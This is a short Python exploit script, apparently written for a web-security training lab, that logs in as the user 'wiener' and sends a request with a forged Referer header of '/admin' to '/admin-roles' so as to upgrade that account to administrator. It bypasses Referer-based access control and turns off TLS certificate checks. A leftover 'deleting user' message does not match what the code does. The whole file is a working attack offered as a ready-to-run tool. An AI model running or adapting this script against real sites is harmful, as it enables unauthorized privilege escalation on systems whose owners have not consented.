import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def escalate(s,url):
    referer_req = "/admin"
    payload = "/admin-roles?username=wiener&action=upgrade"
    params = {'username':'wiener','password':'peter'}
    res = s.post(url + "/login",data = params,verify=False)
    if "Log out" in res.text:
        print("[+]logged in as wiener...")
    else:
        print("[-]exiting..")
        sys.exit(-1)

    s.headers.update({'referer': url + referer_req})
    res = s.get(url + payload,verify=False)
    print(s.headers)
    # print(res.text)

    if "Solved" in res.text:
        print("[+]exploit successfull")
    else:
        print("[-]exploit failed")

def main():
    if len(sys.argv) != 2:
        print("[+]usage: %s <url>"%sys.argv[0])
        sys.exit(-1)
    
    print("[+]deleting user...")
    url = sys.argv[1]
    s = requests.Session()

    escalate(s,url)


if __name__ == "__main__":
    main()